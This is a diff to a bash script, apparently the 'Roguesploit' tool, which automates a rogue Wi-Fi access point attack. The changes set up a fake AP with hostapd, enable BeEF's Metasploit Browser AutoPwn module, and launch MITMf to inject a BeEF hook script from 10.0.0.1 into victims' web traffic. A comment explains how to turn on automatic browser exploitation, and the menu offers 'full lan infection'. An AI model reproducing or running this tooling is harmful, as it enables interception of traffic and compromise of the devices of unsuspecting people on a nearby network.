@@ -903,18 +903,19 @@ EOF
 
 			[[[[WindowsIntelx86]]]]
 			PATCH_DLL = False
-" > /etc/mitmf/mitmf.conf
+EOF
 	sleep 0.6
 	echo -e $blue"["$yellow"*"$blue"]"$white" Enabling Autopwn module for BeEF! "$blue"["$yellow"*"$blue"]"
 	cp /usr/share/beef-xss/modules/metasploit/browser_autopwn/config.yaml /usr/share/beef-xss/modules/metasploit/browser_autopwn/config.yaml.reset
-	echo "# Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
+	cat << "EOF" > /usr/share/beef-xss/modules/metasploit/browser_autopwn/config.yaml
+# Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
 # Browser Exploitation Framework (BeEF) - http://beefproject.com
 # See the file 'doc/COPYING' for copying permission
 #
 beef:
     module:
         browser_autopwn:
-            enable: false
+            enable: true
             category: "Metasploit"
             name: "Browser AutoPwn"
             description: "This module will redirect a user to the autopwn port on a Metasploit listener and then rely on Metasploit to handle the resulting shells.  If the Metasploit extension is loaded, this module will pre-populate the URL to the pre-launched listener.  Otherwise, enter the URL you would like the user to be redirected to."
@@ -924,11 +925,10 @@ beef:
 EOF
 	sleep 0.6
 	echo -e $blue"["$red"!"$blue"]"$white" Starting Roguesploit Pwning! "$blue"["$red"!"$blue"]"
-	rogueon && echo -e $blue"["$red"!"$blue"]"$white" MITMF will load after 20 sec to permit BeEF to load everything!"$blue"["$red"!"$blue"]" & xterm -title "BeEF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1 -e "bash BeEFStarter.sh" & sleep 20 && xterm -title "MITMF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25-1 -e "sudo mitmf -i at0 --hsts --inject --js-url http://10.0.0.1:3000/hook.js" #add "--browsersniper" if you want to enable automatic pwning of injected browsers;
+	rogueon && echo -e $blue"["$red"!"$blue"]"$white" MITMF will load after 20 sec to permit BeEF to load everything!"$blue"["$red"!"$blue"]" & xterm -title "BeEF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1 -e "bash BeEFStarter.sh" & sleep 20 && xterm -title "MITMF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25-1 -e "sudo mitmf -i wlan1 --hsts --inject --js-url "http://10.0.0.1:3000/hook.js"" #add "--browsersniper" if you want to enable automatic pwning of injected browsers;
 #but you need to change some other option to enable correctly the metasploit method too;
 # Line 370: "auto_msfrpcd: false" to "auto_msfrpcd: true"
 # Line 319: "enable: false" to "enable: true"
-# Line 917: "enable: false" to "enable: true"
 # Line 927: change seconds to 30 or more for stability and good timing (Ex.  .. sleep 20 .. to .. sleep 30 ..) 
 	menu
 }
@@ -949,7 +949,7 @@ echo -e $lightgreen"       3. Credits"
 echo -e $lightgreen"       4. Exit"
 echo -e $lightgreen"       5. TUTORIAL"
 echo -e $yellow"       6. Update wit Git"
-echo -ne $yellow"$myname@roguesploit:"; read answer1
+echo -ne $red"["$yellow"$myname"$red"@"$yellow"roguesploit"$red"]"$yellow": "; read answer1
 
 if test $answer1 == '1'
 	then
@@ -964,14 +964,22 @@ if test $answer1 == '1'
 	sleep 1
 	echo -e $yellow"Starting RogueAP on wlan1 with name $nameap"
 	sleep 2
-	rogueon && airbase-ng -e "$nameap" -v wlan1 
+	service network-manager stop
+	echo "
+interface=wlan1
+driver=nl80211
+ssid=$nameap
+channel=6
+hw_mode=g " > $PWD/hostapd.conf
+	rogueon && xterm -title "BeEF" -bg "#000000" -fg "#ffff00" -geometry 100x25-1-1 -e "hostapd hostapd.conf"
+	service network-manager start
 	menu
 elif test $answer1 == '2'
 	then
 	clear
 	echo -e $green"Which services do you want to start $myname? "
-	echo -e $yellow" 1. Browser Autopwn 1 "
-	echo -e $blue" 2. Browser Autopwn 2 "
+	echo -e $yellow" 1. Browser Autopwn 1"
+	echo -e $blue" 2. Browser Autopwn 2"
 	echo -e $white" 3. BeEF + MITMF full lan infection"
 	echo -ne $red"$myname@pwningservices: ";tput sgr0
 	read choice
@@ -1137,6 +1145,7 @@ welcome
 clear
 mitmf_install
 clear
+notify-send --urgency=critical RogueSploit "Please remember to update sometimes! (Just check to have an internet connection and use the option 6)"
 echo -e $yellow"--<"$blue"[*]"$yellow" Welcome $myname, this is Roguesploit v0.3 -- by _B4ckp0r7 "$blue"[*]"$yellow">--"
 echo -e $lightgreen"--<[?] What do you want to do? [?]>-- ";
 echo -e $lightgreen"       1. Start RogueAP"
@@ -1145,7 +1154,7 @@ echo -e $lightgreen"       3. Credits"
 echo -e $lightgreen"       4. Exit"
 echo -e $lightgreen"       5. TUTORIAL"
 echo -e $yellow"       6. Update wit Git"
-echo -ne $yellow"$myname@roguesploit:"; read answer1
+echo -ne $red"["$yellow"$myname"$red"@"$yellow"roguesploit"$red"]"$yellow": "; read answer1
 
 if test $answer1 == '1'
 	then
@@ -1160,7 +1169,15 @@ if test $answer1 == '1'
 	sleep 1
 	echo -e $yellow"Starting RogueAP on wlan1 with name $nameap"
 	sleep 2
-	rogueon && airbase-ng -e "$nameap" -v wlan1
+	service network-manager
+	echo "
+interface=wlan1
+driver=nl80211
+ssid=$nameap
+channel=6
+hw_mode=g " > $PWD/hostapd.conf
+	rogueon && xterm -title "BeEF" -bg "#000000" -fg "#ffff00" -geometry 100x25-1-1 -e "hostapd hostapd.conf"
+	service network-manager start
 	menu
 elif test $answer1 == '2'
 	then
